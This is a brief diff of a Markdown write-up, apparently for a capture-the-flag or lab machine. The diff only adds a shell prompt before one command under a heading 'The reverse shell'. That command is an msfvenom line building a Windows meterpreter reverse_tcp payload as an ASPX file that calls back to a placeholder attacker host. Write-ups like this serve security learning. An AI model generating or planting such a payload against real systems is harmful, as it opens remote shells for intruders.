@@ -25,7 +25,7 @@ Some information:
 
 ## The reverse shell
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.y.z.w LPORT=1337 -f aspx > devel.aspx
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.y.z.w LPORT=1337 -f aspx > devel.aspx
 ```
 
 This:
